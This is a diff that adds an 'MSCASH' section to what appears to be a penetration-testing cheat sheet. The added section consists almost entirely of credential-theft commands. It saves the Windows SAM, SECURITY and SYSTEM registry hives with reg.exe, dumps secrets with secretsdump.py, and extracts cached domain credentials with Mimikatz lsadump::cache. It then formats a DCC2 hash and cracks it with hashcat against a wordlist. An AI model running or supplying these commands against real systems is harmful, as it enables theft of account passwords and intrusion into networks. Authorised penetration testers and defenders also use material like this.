@@ -223,3 +223,32 @@ Mimikatz One-Liner:
 
 
 ```
+
+
+### MSCASH
+
+```
+Secretsdump:
+
+reg.exe save hklm\sam c:\temp\sam.save
+
+reg.exe save hklm\security c:\temp\security.save
+
+reg.exe save hklm\system c:\temp\system.save
+
+secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+
+Mimikatz:
+
+lsadump::cache
+
+To crack mscache with hashcat, it should be in the following format:
+$DCC2$10240#username#hash
+
+Below shows the original output format from cachedump and the format accepted by hashcat:
+
+echo ; cat hashes.txt ; echo ; cut -d ":" -f 2 hashes.txt
+
+hashcat -m2100 '$DCC2$10240#spot#3407de6ff2f044ab21711a394d85f3b8' /usr/share/wordlists/rockyou.txt --force --potfile-disable
+
+```
